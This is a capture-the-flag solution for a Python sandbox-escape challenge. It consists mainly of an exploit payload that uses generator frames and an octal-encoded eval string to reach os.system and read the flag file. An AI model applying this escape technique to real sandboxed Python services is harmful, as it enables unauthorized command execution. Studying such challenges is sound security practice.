# Babyjail Revenge
- Author: Vincent55
- Category: Misc
- Difficulty: Hard

You are not baby! So you dont need dunder anymore~

## exploit
```python
import sys

payload = """
[*[q:=(q.gi_frame.f_back.f_back.f_globals for _ in [1])][0]][0]['\\x5f_builtins\\x5f_'].eval('\\47\\47\\56\\137\\137\\143\\154\\141\\163\\163\\137\\137\\56\\137\\137\\142\\141\\163\\145\\137\\137\\56\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137\\50\\51\\133\\55\\65\\135\\56\\143\\154\\157\\163\\145\\56\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137\\133\\47\\163\\171\\163\\164\\145\\155\\47\\135\\50\\47\\143\\141\\164\\40\\57\\146\\154\\141\\147\\52\\47\\51')
""".replace('\n', '')

# python exploit.py "cat /flag*" | nc localhost 10004

```
